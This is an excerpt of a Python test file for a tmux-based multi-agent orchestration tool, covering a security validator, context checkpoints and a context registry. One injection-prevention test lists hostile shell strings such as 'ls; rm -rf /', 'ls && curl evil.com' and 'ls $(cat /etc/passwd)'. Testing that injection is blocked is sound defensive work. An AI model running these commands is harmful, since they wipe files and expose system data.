...
from ai_team.core.context_registry import ContextCheckpoint, ContextState, ContextRegistry
from ai_team.utils.tmux_utils import TmuxOrchestrator, TmuxWindow, TmuxSession
...
class TestSecurityValidator:
    ...
    def test_sanitize_command_basic(self):
        ...
        test_cases = ["ls -la", "git status", 'echo "hello world"', "python3 script.py"]
    ...
    def test_sanitize_command_injection_prevention(self):
        ...
        malicious_commands = ["ls; rm -rf /", "ls && curl evil.com", "ls $(cat /etc/passwd)", "ls `rm -rf /`"]
    ...
    def test_sanitize_message_basic(self):
        ...
        messages = ["Hello, agent!", "Complete task X", "Status: working on feature Y"]
...
class TestContextCheckpoint:
    ...
    def test_checkpoint_creation(self, sample_context_data):
        ...
        checkpoint = ContextCheckpoint.create(
            agent_id="test:0", session_name="test", window_index=0, context_data=sample_context_data
        )
    ...
    def test_checkpoint_immutability(self, sample_context_data):
        ...
        checkpoint = ContextCheckpoint.create(
            agent_id="immutable:0", session_name="immutable", window_index=0, context_data=sample_context_data
        )
    ...
    def test_checkpoint_integrity_verification(self, sample_context_data):
        ...
        checkpoint = ContextCheckpoint.create(
            agent_id="integrity:0", session_name="integrity", window_index=0, context_data=sample_context_data
        )
    ...
    def test_checkpoint_with_parent(self, sample_context_data):
        ...
        parent = ContextCheckpoint.create(
            agent_id="parent:0", session_name="parent", window_index=0, context_data={"phase": "initial"}
        )
...
class TestTmuxDataStructures:
    ...
    def test_tmux_window_creation(self):
        ...
        window = TmuxWindow(session_name="test", window_index=1, window_name="alex", active=True)
    ...
    def test_tmux_session_creation(self):
        ...
        windows = [TmuxWindow("test", 0, "orchestrator", True), TmuxWindow("test", 1, "alex", False)]

        session = TmuxSession(name="test", windows=windows, attached=True)
...
class TestTmuxOrchestratorCore:
    ...
    def test_capture_window_content_validation(self, mock_subprocess):
        ...
        mock_subprocess.return_value = Mock(stdout="mocked window content", returncode=0)
...
class TestContextRegistry:
    ...
    def test_state_management(self, mock_context_registry):
        ...
        # Update state
        mock_context_registry.update_state("test_session", 0, current_task="test_task", custom_field="custom_value")
    ...
    def test_create_checkpoint_basic(self, mock_context_registry, sample_context_data):
        """Test basic checkpoint creation"""
        checkpoint_id = mock_context_registry.create_checkpoint("test_session", 0, sample_context_data)
